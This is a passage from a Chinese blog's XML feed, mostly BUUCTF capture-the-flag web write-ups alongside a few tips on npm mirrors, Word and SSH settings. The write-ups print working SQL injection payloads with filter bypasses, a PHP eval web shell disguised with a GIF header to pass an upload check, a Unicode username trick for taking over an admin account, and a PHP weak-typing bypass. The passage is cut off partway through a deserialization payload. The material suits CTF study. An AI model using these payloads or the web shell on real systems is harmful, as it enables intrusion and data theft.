<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token operator">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>newpassword<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'change successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'change.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'change'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">return</span> username</code></pre><p>这几个模块中都调用了<code>nodeprep.prepare</code>这个函数</p><p>查阅资料</p><p><code>nodeprep.prepare</code>这个函数会把大写转换为小写 并且会做如下转换<br>假如有一个<code>ᴬ</code>字符 第一次调用函数时会造成<code>ᴬ-&gt;A</code>，第二次调用时会<code>A-&gt;a</code><br>所以思路就是 我们注册一个<code>ᴬdmin</code>账号 此时第一次调用<code>nodeprep.prepare</code> 账号变为<br><code>Admin</code>,在修改密码，会再次调用<code>nodeprep.prepare</code>,这是就变成了<code>admin</code></p><p>再用改的密码登录admin就成功了</p><p><img src="https://z3.ax1x.com/2021/03/29/c9Er60.png" alt="c9Er60.png"></p><p><img src="https://z3.ax1x.com/2021/03/29/c9Eg7F.png" alt="c9Eg7F.png"><img src="https://z3.ax1x.com/2021/03/29/c9ERk4.png" alt="c9ERk4.png"></p><p><img src="https://z3.ax1x.com/2021/03/29/c9Efh9.png" alt="c9Efh9.png"></p><p><img src="https://z3.ax1x.com/2021/03/29/c9E4pR.png" alt="c9E4pR.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>word关闭首字母自动大写</title>
      <link href="2021/03/24/word-guan-bi-shou-zi-mu-zi-dong-da-xie/"/>
      <url>2021/03/24/word-guan-bi-shou-zi-mu-zi-dong-da-xie/</url>
      
        <content type="html"><![CDATA[<p>点击文件<img src="https://z3.ax1x.com/2021/03/24/6bPD2t.png" alt="6bPD2t.png">点击选项</p><p><img src="https://z3.ax1x.com/2021/03/24/6bPRaQ.png" alt="6bPRaQ.png"></p><p>点击校对</p><p><img src="https://z3.ax1x.com/2021/03/24/6bPhPs.png" alt="6bPhPs.png"></p><p>点击自动更正选项</p><p><img src="https://z3.ax1x.com/2021/03/24/6bPTMV.png" alt="6bPTMV.png"></p><p>欧拉</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>npm换源</title>
      <link href="2021/03/22/npm-huan-yuan/"/>
      <url>2021/03/22/npm-huan-yuan/</url>
      
        <content type="html"><![CDATA[<h2 id="npm换源"><a href="#npm换源" class="headerlink" title="npm换源"></a>npm换源</h2><p>临时源</p><pre class=" language-bash"><code class="language-bash">在安装时候临时指定$ <span class="token function">npm</span> --registry http://registry.cnpmjs.org install/info express</code></pre><p>持久源</p><pre class=" language-bash"><code class="language-bash">$ <span class="token function">npm</span> config <span class="token keyword">set</span> registry https://registry.npm.taobao.org</code></pre><p>永久修改镜像源</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#查看 npm 配置</span>$ <span class="token function">npm</span> config list<span class="token comment" spellcheck="true"># 其他查看配置的方式</span>$ <span class="token function">npm</span> config get globalconfig$ <span class="token function">npm</span> config <span class="token function">ls</span> -l找到并打开配置文件：~/.npmrc写入配置：registry<span class="token operator">=</span>https://registry.npm.taobao.org</code></pre><p>验证设置是否成功</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> config get registry<span class="token comment" spellcheck="true"># OR</span><span class="token function">npm</span> info express</code></pre><p>淘宝npm镜像</p><ul><li>搜索地址：<a href="http://npm.taobao.org/">http://npm.taobao.org/</a></li><li>registry地址：<a href="http://registry.npm.taobao.org/">http://registry.npm.taobao.org/</a></li></ul><p>cnpmjs镜像</p><ul><li>搜索地址：<a href="http://cnpmjs.org/">http://cnpmjs.org/</a></li><li>registry地址：<a href="http://r.cnpmjs.org/">http://r.cnpmjs.org/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh拒绝连接</title>
      <link href="2021/03/21/ssh-ju-jue-lian-jie/"/>
      <url>2021/03/21/ssh-ju-jue-lian-jie/</url>
      
        <content type="html"><![CDATA[<ol><li>sudo vi /etc/ssh/sshd_config  将PermitRootLogin修改为yes</li><li>sudo /etc/init.d/ssh restart重启动了sshd服务</li></ol>]]></content>
      
      
      <categories>
          
          <category> bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 HardSQL</title>
      <link href="2021/03/17/ji-ke-da-tiao-zhan-2019-hardsql/"/>
      <url>2021/03/17/ji-ke-da-tiao-zhan-2019-hardsql/</url>
      
        <content type="html"><![CDATA[<p>打开页面，还是注入</p><pre class=" language-sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>password</code></pre><p>万能密码不行，并且一直是相同的返回信息，被过滤了就会显示这个</p><p><img src="https://s3.ax1x.com/2021/03/18/6gZkFO.png" alt="6gZkFO.png"></p><pre class=" language-sql"><code class="language-sql">?username<span class="token operator">=</span>admin'<span class="token operator">&amp;</span>password<span class="token operator">=</span>password</code></pre><p><img src="https://s3.ax1x.com/2021/03/18/6gZZSH.png" alt="6gZZSH.png"></p><p>报错可以报错注入</p><p>构造payload,这里还过滤了空格(括号绕过)</p><pre class=" language-sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token string">'or(updatexml(1,concat(0x7e,(select(database())),0x7e),1))%23&amp;password=1or?username=admin'</span><span class="token operator">or</span><span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>XPATH syntax error: <span class="token string">'~geek~'</span></code></pre><pre class=" language-sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token string">'or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=1XPATH syntax error: '</span><span class="token operator">~</span>H4rDsq1<span class="token operator">~</span>'</code></pre><pre class=" language-sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token string">'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('</span>H4rDsq1<span class="token string">')),0x7e),1))%23&amp;password=1XPATH syntax error: '</span><span class="token operator">~</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token operator">~</span>'</code></pre><pre class=" language-sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token string">'or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23&amp;password=1XPATH syntax error: '</span><span class="token operator">~</span>flag<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;ee2d297b-ca3d-4d9e-9c8a-d2'</span></code></pre><p>flag没全部输出，大笑.gif</p><pre class=" language-sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token string">'or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1))%23&amp;password=1XPATH syntax error: '</span><span class="token operator">~</span><span class="token number">b</span><span class="token operator">-</span><span class="token number">ca3d</span><span class="token operator">-</span><span class="token number">4d9e</span><span class="token operator">-</span><span class="token number">9c8a</span><span class="token operator">-</span><span class="token number">d23113610a22</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;~'</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2020_新生赛 BackupFile</title>
      <link href="2021/03/09/actf2020-xin-sheng-sai-backupfile/"/>
      <url>2021/03/09/actf2020-xin-sheng-sai-backupfile/</url>
      
        <content type="html"><![CDATA[<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>扫描目录，下载index.php.bak(这就是备份文件)<img src="https://s3.ax1x.com/2021/03/09/68T7AH.png" alt="68T7AH.png"><code>index.php.bak</code>代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include_once</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"Just num!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token keyword">else</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">echo</span> <span class="token string">"Try to find out source file!"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre><p>代码审计</p><p>$key不为数字，且等于$str,显示flag</p><p>这里涉及到php的弱类型，123==”123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”</p><p>传入参数得到flag</p><pre class=" language-php"><code class="language-php">payload：<span class="token operator">?</span>key<span class="token operator">=</span><span class="token number">123</span><span class="token operator">&amp;</span>str<span class="token operator">=</span><span class="token string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 BabySQL</title>
      <link href="2021/03/09/ji-ke-da-tiao-zhan-2019-babysql/"/>
      <url>2021/03/09/ji-ke-da-tiao-zhan-2019-babysql/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>有登录的一般都会想到万能密码，过滤了大不了绕过吧，和前面没多大区别</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>password</code></pre><p>未能成功，双写绕过<code>or</code>试试</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' oorr '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>password</code></pre><p>这里确实存在注入点，成功了，开始注入</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2  %23&amp;password=password报错，双写union selectcheck.php?username='</span> ununionion selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>  <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>passwordThe used <span class="token keyword">SELECT</span> statements have <span class="token number">a</span> different number <span class="token keyword">of</span> <span class="token keyword">columns</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' ororderder by 3 %23&amp;password=2order被pass了，直接挨着猜check.php?username='</span> ununionion selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span>  <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span><span class="token number">3</span>列，哈哈</code></pre><pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>' ununionion selselectect <span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">//Hello 10.3.18-MariaDB！</span><span class="token comment" spellcheck="true">//Your password is 'geek'</span><span class="token comment" spellcheck="true">//得到数据库版本和当前数据库名称</span></code></pre><p>爆所有数据库名</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' ununionion selselectect 1,2,group_concat(schema_name) frofromm infoorrmation_schema.schemata  %23&amp;password=2Hello 2！Your password is '</span>information_schema<span class="token punctuation">,</span>mysql<span class="token punctuation">,</span>performance_schema<span class="token punctuation">,</span>test<span class="token punctuation">,</span>ctf<span class="token punctuation">,</span>geek'</code></pre><p><code>ctf</code>可疑，爆表名</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span> ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>frfromom<span class="token punctuation">(</span>infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span>whwhereere table_schema<span class="token operator">=</span><span class="token string">'ctf'</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span> Hello <span class="token number">2</span>！Your password <span class="token operator">is</span> <span class="token string">'Flag'</span></code></pre><p>爆列名</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span> ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>frfromom<span class="token punctuation">(</span>infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span>whwhereere table_name<span class="token operator">=</span><span class="token string">'Flag'</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span> Hello <span class="token number">2</span>！Your password <span class="token operator">is</span> <span class="token string">'flag'</span></code></pre><p>爆数据</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span> ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>frfromom<span class="token punctuation">(</span>ctf<span class="token punctuation">.</span>Flag<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span> Hello <span class="token number">2</span>！Your password <span class="token operator">is</span> 'flag<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;cc46361f-7094-4e08-a744-2c4c3fcc9eb0&amp;#125;'</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 Upload</title>
      <link href="2021/03/09/ji-ke-da-tiao-zhan-2019-upload/"/>
      <url>2021/03/09/ji-ke-da-tiao-zhan-2019-upload/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>很明显是一个文件上传漏洞</p><p>编辑一个文件<code>1.php</code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'chopper'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p>上传bp抓包</p><p><img src="https://s3.ax1x.com/2021/03/09/61lBE8.png" alt="61lBE8.png"></p><p>提示<code>Not image!</code>，修改Content-Type: image/jpeg</p><p><img src="https://s3.ax1x.com/2021/03/09/61lyCQ.png" alt="61lyCQ.png"></p><p><code>NOT PHP</code>,修改文件后缀名，经测试 <code>phtml</code>等通过</p><p><img src="https://s3.ax1x.com/2021/03/09/61l5UU.png" alt="61l5UU.png"></p><p>不能包含<code>&lt;?</code>,换一种写法 </p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>@<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'chopper'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre><p><img src="https://s3.ax1x.com/2021/03/09/61l4ET.png" alt="61l4ET.png"></p><p>还是没有image，可能检查了文件内容，加上gif的文件幻数，在PHP代码前加上GIF89a</p><pre class=" language-php"><code class="language-php">GIF89a<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>@<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'chopper'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre><p><img src="https://s3.ax1x.com/2021/03/09/61lgvn.png" alt="61lgvn.png"></p><p>上传成功了，猜测文件在upload目录下<img src="https://s3.ax1x.com/2021/03/09/61lz5D.png" alt="61lz5D.png"></p><p>用蚁剑连接，即可找到flag</p><p><img src="https://s3.ax1x.com/2021/03/09/611pPe.png" alt="611pPe.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 PHP</title>
      <link href="2021/03/08/ji-ke-da-tiao-zhan-2019-php/"/>
      <url>2021/03/08/ji-ke-da-tiao-zhan-2019-php/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>页面提示<code>我有一个良好的备份网站的习惯</code></p><p>找一个备份的字典扫扫网站目录</p><p><img src="https://s3.ax1x.com/2021/03/08/61ZBrD.png" alt="61ZBrD.png"></p><p>下载这个压缩包<code>www.zip</code></p><p>有几个文件</p><p>class.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre><p>index.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">include</span> <span class="token string">'class.php'</span><span class="token punctuation">;</span>    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token delimiter">?></span></code></pre><p><code>unserialize</code>很明显这是一个反序列化漏洞</p><p><code>echo $flag</code>条件是<code>username === &#39;admin&#39; and password == 100</code></p><p>生成序列化</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">'admin'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">'100'</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>        <span class="token comment" spellcheck="true">//得到O:4:"Name":2:&amp;#123;s:14:" Name 